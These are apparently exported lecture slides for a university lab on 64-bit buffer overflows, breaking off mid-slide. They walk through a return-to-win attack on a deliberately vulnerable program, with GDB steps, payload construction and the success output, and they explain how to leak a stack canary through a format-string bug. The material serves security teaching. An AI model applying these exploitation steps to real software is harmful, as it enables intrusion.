{"index":0,"title":"Buffer Overflow Attack","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Buffer Overflow Attack","position":{"left":86.4,"top":244.8,"width":1104,"height":115.2},"style":{"fontSize":69.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"Part 2 — Returning to win() on a 64-bit target","position":{"left":91.2,"top":360,"width":1104,"height":67.2},"style":{"fontSize":34.67,"typeface":"Arial","color":"#404040","alignment":"left"}}]}
{"index":1,"title":"From Part 1 to Lab 2","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"From Part 1 to Lab 2","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"Part 1 showed the core idea: an overflow can overwrite the saved return address and redirect control flow.\nLab 2 keeps that idea but changes the setting:\n64-bit (x86-64), not 32-bit — registers are %rsp / %rbp, addresses are 8 bytes.\nThe stack is non-executable (NX). We do NOT inject or run shellcode.\nInstead we return into a function that already exists in the program: win().\nThis technique is called return-to-win (a minimal return-oriented attack).","position":{"left":62.4,"top":163.2,"width":1142.4,"height":499.2},"style":{"fontSize":29.33,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"2","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":2,"title":"Two Ways to Hijack a Return Address","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Two Ways to Hijack a Return Address","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"Part 1 — code injection","position":{"left":76.8,"top":153.6,"width":537.6,"height":48},"style":{"fontSize":26.67,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"Place malicious bytes (shellcode) in the buffer.\nOverwrite the return address to point INTO the buffer.\nCPU executes the bytes you supplied.\nBlocked when the stack is non-executable (NX / DEP).","position":{"left":76.8,"top":206.4,"width":547.2,"height":499.2},"style":{"fontSize":24,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"Lab 2 — return-to-win (code reuse)","position":{"left":672,"top":153.6,"width":556.8,"height":48},"style":{"fontSize":26.67,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"Inject NO code at all.\nOverwrite the return address with the address of an existing function: win().\nCPU 'returns' into win(), which runs normally.\nWorks even with NX on — we only reuse existing code.","position":{"left":672,"top":206.4,"width":556.8,"height":499.2},"style":{"fontSize":24,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"3","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":3,"title":"The Target: vault.c","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"The Target: vault.c","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"static void win(void) {                 // the goal\n    puts(\"LAB2-WIN:vault-4a44dc15\");     // build-specific token\n    fflush(stdout);\n}\n \nstatic void check_request(const unsigned char *input,\n                          size_t len) {\n    volatile unsigned long padding[PAD_WORDS];\n    char note[NOTE_SIZE];                // 56 bytes in this build\n \n    if (len < 4) { puts(\"(malformed request)\"); return; }\n    memcpy(note, input, len);            // <-- the bug: no bound\n    ...\n}\n \nint main(void) {\n    unsigned char input[MAX_REQUEST];    // up to 512 bytes\n    size_t len = fread(input, 1, sizeof(input), stdin);\n    check_request(input, len);\n}","position":{"left":62.4,"top":148.8,"width":816,"height":518.4},"style":{"fontSize":18,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"win() is never called by the program.\nIt just prints your token. Reaching it is the whole goal.\ncheck_request() copies attacker-controlled input into a small fixed buffer.\nnote holds 56 bytes; input can be up to 512.","position":{"left":902.4,"top":163.2,"width":345.6,"height":499.2},"style":{"fontSize":22.67,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"4","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":4,"title":"The Vulnerability","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"The Vulnerability","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"char note[NOTE_SIZE];         // 56 bytes\n...\nmemcpy(note, input, len);     // len can be up to 512","position":{"left":76.8,"top":163.2,"width":787.2,"height":144},"style":{"fontSize":21.33,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"memcpy copies len bytes with no check that len <= sizeof(note).\nIf len > 56, the copy runs off the end of note and writes over whatever follows it on the stack:\nthe saved frame pointer (saved %rbp),\nthen the saved return address (saved %rip).\nmemcpy copies raw bytes — unlike strcpy it does not stop at a 0x00 byte, so any address can be written.\nControl what sits in the saved return address  =>  control where the function returns.","position":{"left":76.8,"top":326.4,"width":1152,"height":499.2},"style":{"fontSize":26.67,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"5","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":5,"title":"x86-64 Stack Frame Refresher","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"x86-64 Stack Frame Refresher","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"On entry a function saves the caller's %rbp, then uses %rbp to anchor the frame.\nTwo saved values sit just above the locals:\nsaved %rbp  at  [%rbp]\nsaved return address (%rip)  at  [%rbp + 8]\nret pops the 8 bytes at the top of the stack into %rip and jumps there.\nAddresses are 8 bytes, stored little-endian (least-significant byte first).","position":{"left":72,"top":163.2,"width":681.6,"height":499.2},"style":{"fontSize":26.67,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"saved return addr  [rbp+8]","position":{"left":835.2,"top":168,"width":355.2,"height":59.52},"style":{"fontSize":17.33,"typeface":"Consolas","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"saved rbp          [rbp]","position":{"left":835.2,"top":227.52,"width":355.2,"height":59.52},"style":{"fontSize":17.33,"typeface":"Consolas","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"local variables","position":{"left":835.2,"top":287.04,"width":355.2,"height":59.52},"style":{"fontSize":17.33,"typeface":"Consolas","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"note[ ]  (buffer)","position":{"left":835.2,"top":346.56,"width":355.2,"height":59.52},"style":{"fontSize":17.33,"typeface":"Consolas","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"high addr","position":{"left":1195.2,"top":143.04,"width":115.2,"height":28.8},"style":{"fontSize":16,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"low addr","position":{"left":1195.2,"top":401.28,"width":115.2,"height":28.8},"style":{"fontSize":16,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"stack grows down ↓","position":{"left":820.8,"top":413.76,"width":374.4,"height":28.8},"style":{"fontSize":17.33,"typeface":"Arial","color":"#595959","alignment":"center"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"6","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":6,"title":"The Plan: Overwrite Saved %rip with &win","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"The Plan: Overwrite Saved %rip with &win","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"saved return address  (8 B)","position":{"left":470.4,"top":158.4,"width":412.8,"height":91.2},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","bold":true,"alignment":"center"}},{"kind":"textbox","text":"saved %rbp  (8 B)","position":{"left":470.4,"top":249.6,"width":412.8,"height":91.2},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"padding[1]  (8 B)","position":{"left":470.4,"top":340.8,"width":412.8,"height":91.2},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"note[56]","position":{"left":470.4,"top":432,"width":412.8,"height":91.2},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"offset 72","position":{"left":321.6,"top":185.28,"width":144,"height":38.4},"style":{"fontSize":18.67,"typeface":"Arial","color":"#595959","alignment":"right"}},{"kind":"textbox","text":"offset 64","position":{"left":321.6,"top":276.48,"width":144,"height":38.4},"style":{"fontSize":18.67,"typeface":"Arial","color":"#595959","alignment":"right"}},{"kind":"textbox","text":"offset 56","position":{"left":321.6,"top":367.68,"width":144,"height":38.4},"style":{"fontSize":18.67,"typeface":"Arial","color":"#595959","alignment":"right"}},{"kind":"textbox","text":"offset 0","position":{"left":321.6,"top":458.88,"width":144,"height":38.4},"style":{"fontSize":18.67,"typeface":"Arial","color":"#595959","alignment":"right"}},{"kind":"shape","position":{"left":886.07,"top":203.52,"width":179.53,"height":0.06}},{"kind":"textbox","text":"write &win here\n(0x4011d6)","position":{"left":1070.4,"top":169.92,"width":288,"height":76.8},"style":{"fontSize":21.33,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"high","position":{"left":888,"top":131.52,"width":96,"height":28.8},"style":{"fontSize":16,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"low","position":{"left":888,"top":518.4,"width":96,"height":28.8},"style":{"fontSize":16,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"Fill 72 bytes to reach the saved return address, then write the 8-byte address of win().","position":{"left":76.8,"top":547.2,"width":1132.8,"height":57.6},"style":{"fontSize":24,"typeface":"Arial","color":"#404040","alignment":"center"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"7","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":7,"title":"Step 1 — Find the Address of win() in GDB","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Step 1 — Find the Address of win() in GDB","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"The vuln build is -no-pie, so win() sits at a fixed address — GDB prints it directly, no need to run the program yet:","position":{"left":72,"top":153.6,"width":1180.8,"height":499.2},"style":{"fontSize":26.67,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"$ gdb ./vault\n(gdb) print &win\n$1 = (void (*)(void)) 0x4011d6 <win>\n \n(gdb) info address win\nSymbol \"win\" is a function at address 0x4011d6.","position":{"left":76.8,"top":249.6,"width":873.6,"height":216},"style":{"fontSize":21.33,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"win() = 0x4011d6 in this build.\nUse  p &win  for the entry address (break win lands a few bytes in, past endbr64).\nYour build's address and token differ — always read them from YOUR binary.","position":{"left":76.8,"top":489.6,"width":1180.8,"height":499.2},"style":{"fontSize":24,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"8","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":8,"title":"Step 2 — Find the Offset in GDB","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Step 2 — Find the Offset in GDB","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"(gdb) break check_request\n(gdb) run < tests/accept.bin\n...\n(gdb) print &note\n$1 = (char (*)[56]) 0x7fffffff8cf0\n(gdb) print $rbp\n$2 = (void *) 0x7fffffff8d30\n(gdb) print (char*)($rbp+8) - (char*)note\n$3 = 72","position":{"left":67.2,"top":153.6,"width":796.8,"height":374.4},"style":{"fontSize":20,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"saved return address is at $rbp + 8.\noffset = (rbp+8) − &note = 72 bytes.\nThat is 56 (note) + 8 (padding) + 8 (saved rbp).\nx/40gx note shows the same bytes if you prefer to read the frame directly.","position":{"left":883.2,"top":163.2,"width":374.4,"height":499.2},"style":{"fontSize":21.33,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"9","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":9,"title":"Step 3 — Build payload.bin","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Step 3 — Build payload.bin","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"Give the two values you measured in Steps 1-2 to exploit.py; it assembles the bytes and writes payload.bin:","position":{"left":72,"top":148.8,"width":1190.4,"height":499.2},"style":{"fontSize":25.33,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"$ python3 exploit.py --offset 72 --win 0x4011d6\n[*] offset = 72 filler byte(s) ('A')\n[*] win    = 0x4011d6  ->  little-endian  d6 11 40 00 00 00 00 00\n[+] wrote payload.bin (80 bytes)","position":{"left":76.8,"top":225.6,"width":1056,"height":168},"style":{"fontSize":19.33,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"The payload is simply:   72 filler bytes   +   &win as 8 little-endian bytes","position":{"left":76.8,"top":417.6,"width":1113.6,"height":38.4},"style":{"fontSize":24,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"0x00000000004011d6   ->   d6 11 40 00 00 00 00 00","position":{"left":76.8,"top":470.4,"width":748.8,"height":69.12},"style":{"fontSize":21.33,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"The 72 filler bytes only move the write cursor to the saved return address; the last 8 bytes are &win.\nexploit.py does NOT find the values for you — you supply the offset and address you read in GDB.","position":{"left":76.8,"top":566.4,"width":1190.4,"height":499.2},"style":{"fontSize":21.33,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"10","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":10,"title":"Step 4 — Run It","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Step 4 — Run It","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"$ ./vault < payload.bin\nvault build 4a44dc15\nrequest rejected\nLAB2-WIN:vault-4a44dc15          <-- success\nSegmentation fault (core dumped)","position":{"left":72,"top":158.4,"width":883.2,"height":220.8},"style":{"fontSize":21.33,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"The token prints — control reached win(). That is what the grader checks.\n\"request rejected\" is normal: note now starts with 'AAAA', not 'OPEN'.\nThe segfault AFTER the token is expected and harmless: win() returns into the 'A' filler, which is not a valid address. The win() output has already been produced.\n(Optional polish: return cleanly by chaining a real return address after &win.)","position":{"left":76.8,"top":393.6,"width":1171.2,"height":499.2},"style":{"fontSize":25.33,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"11","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":11,"title":"Why It Works","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Why It Works","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"check_request() finishes and executes ret.\nret pops the 8 bytes at the top of the stack into %rip — but those 8 bytes are now &win, not the real caller.\nThe CPU jumps to win(), which prints the token.\nNo code was injected; we only redirected an existing return.","position":{"left":72,"top":168,"width":672,"height":499.2},"style":{"fontSize":28,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"&win  (0x4011d6)","position":{"left":816,"top":168,"width":384,"height":86.4},"style":{"fontSize":18.67,"typeface":"Consolas","color":"#000000","bold":true,"alignment":"center"}},{"kind":"textbox","text":"'AAAA...' (saved rbp)","position":{"left":816,"top":254.4,"width":384,"height":86.4},"style":{"fontSize":18.67,"typeface":"Consolas","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"'AAAA...' (padding)","position":{"left":816,"top":340.8,"width":384,"height":86.4},"style":{"fontSize":18.67,"typeface":"Consolas","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"'AAAA...' (note[56])","position":{"left":816,"top":427.2,"width":384,"height":86.4},"style":{"fontSize":18.67,"typeface":"Consolas","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"ret  pops  %rip  ───►  win()","position":{"left":796.8,"top":525.12,"width":432,"height":38.4},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","bold":true,"alignment":"center"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"12","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":12,"title":"GDB Quick Reference","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"GDB Quick Reference","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"break check_request       # stop inside the vulnerable function\nrun < tests/accept.bin    # feed a benign request\ninfo frame                # frame layout, saved rip location\nprint &note               # address of the buffer\nprint $rbp                # frame pointer\nx/40gx note               # dump 40 giant (8-byte) words as hex\nprint &win                # address of the target function\np (char*)($rbp+8)-(char*)note   # the offset you need","position":{"left":67.2,"top":163.2,"width":1142.4,"height":336},"style":{"fontSize":20.67,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"gx = giant word (8 bytes), the natural size on x86-64. (Part 1 used wx, 4 bytes.)\nThe saved return address is the 8-byte value at $rbp + 8.","position":{"left":76.8,"top":518.4,"width":1152,"height":499.2},"style":{"fontSize":24,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"14","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":13,"title":"Stopping the Attack: The Defenses","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Stopping the Attack: The Defenses","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"The ungraded target was built with every protection OFF. Real builds add layers, each aimed at a different step of the attack:\nBounds-checked copy (the real fix) — the copy can't run past the buffer, so there is no overflow at all.\nNX / DEP — the stack is non-executable; stops INJECTED shellcode. (ret2win sidesteps it by reusing existing code.)\nASLR / PIE — win()'s address is randomized every run, so you no longer know where to jump.\nStack canary — a random guard that detects a clobbered return address before the function returns.\nFORTIFY_SOURCE — libc checks the size on memcpy/strcpy and aborts an oversized copy.","position":{"left":72,"top":153.6,"width":1190.39,"height":329.39},"style":{"fontSize":25.33,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"The graded lab turns ON one of these — the stack canary — and leaves the rest off, so you can study it closely.","position":{"left":72,"top":638.4,"width":1190.4,"height":57.6},"style":{"fontSize":21.33,"typeface":"Arial","color":"#595959","bold":true,"alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"16","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":14,"title":"The Graded Lab: Defeat the Stack Canary","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"The Graded Lab: Defeat the Stack Canary","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"The graded vault is compiled with -fstack-protector-strong.\nA random 8-byte canary is placed between the buffer and the saved return address, and checked just before ret.\nTo reach the return address, your overflow must cross the canary.\nOverwrite it with the wrong value and the program aborts — *** stack smashing detected *** — BEFORE ret runs.","position":{"left":67.2,"top":163.2,"width":681.6,"height":499.2},"style":{"fontSize":25.33,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"saved return address","position":{"left":825.6,"top":168,"width":393.6,"height":86.4},"style":{"fontSize":18.67,"typeface":"Arial","color":"#000000","bold":true,"alignment":"center"}},{"kind":"textbox","text":"saved rbp","position":{"left":825.6,"top":254.4,"width":393.6,"height":86.4},"style":{"fontSize":18.67,"typeface":"Arial","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"CANARY (random)","position":{"left":825.6,"top":340.8,"width":393.6,"height":86.4},"style":{"fontSize":18.67,"typeface":"Arial","color":"#000000","bold":true,"alignment":"center"}},{"kind":"textbox","text":"note[ ]  buffer","position":{"left":825.6,"top":427.2,"width":393.6,"height":86.4},"style":{"fontSize":18.67,"typeface":"Arial","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"overflow writes upward ↑","position":{"left":816,"top":523.2,"width":412.8,"height":28.8},"style":{"fontSize":17.33,"typeface":"Arial","color":"#595959","alignment":"center"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"17","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":15,"title":"The Canary's Weakness: Leak and Replay","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"The Canary's Weakness: Leak and Replay","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"The canary is re-randomized on every run, so you cannot guess it (~2^56 possibilities — brute force is hopeless).\nBut the check only COMPARES values. If you read the live canary and write the same bytes back, the check passes.\nSo the attack becomes three moves, all in one run:\nread the current canary,\noverflow while putting that exact value back in its slot,\nand still overwrite the saved return address with &win.\nYou need a way to read memory from the running process — that is the next slide.","position":{"left":72,"top":163.2,"width":1161.61,"height":366.83},"style":{"fontSize":26.67,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"18","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":16,"title":"Reading the Canary: the Format-String Bug","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Reading the Canary: the Format-String Bug","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"The program uses your input as a printf format string:  printf(buf),  not  printf(\"%s\", buf).\nSpecifiers like %p then print values straight off the stack — including the canary. %N$p reads slot N (8 bytes).","position":{"left":67.2,"top":148.8,"width":1200,"height":499.2},"style":{"fontSize":25.33,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"name = \"%15$p\"   ->   hello, 0x2f9a29d1fa7d3900      (the live canary)","position":{"left":67.2,"top":283.2,"width":1132.8,"height":67.2},"style":{"fontSize":20,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"Why not just read the canary in GDB?","position":{"left":67.2,"top":379.2,"width":1200,"height":38.4},"style":{"fontSize":26.67,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"GDB shows the canary for THAT debugging run. Your exploit — and the grader — start a FRESH process with a DIFFERENT canary.\nThe value must be read live, from the same process you overflow. That is exactly what this bug is for.\nThe %N$p index is fixed — you find it once. The canary VALUE changes every run.","position":{"left":72,"top":432,"width":1152,"height":499.2},"style":{"fontSize":24,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"19","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":17,"title":"The Attack, End to End","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"The Attack, End to End","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"Phase 1 — leak: send a format string as the name; read the live canary from the reply.\nPhase 2 — smash: send a length-prefixed overflow built from that leak:","position":{"left":67.2,"top":153.6,"width":1200,"height":499.2},"style":{"fontSize":26.67,"typeface":"Arial","color":"#404040","alignment":"left"}},{"kind":"textbox","text":"filler","position":{"left":105.6,"top":302.4,"width":307.2,"height":100.8},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"leaked canary","position":{"left":412.8,"top":302.4,"width":268.8,"height":100.8},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","bold":true,"alignment":"center"}},{"kind":"textbox","text":"rbp 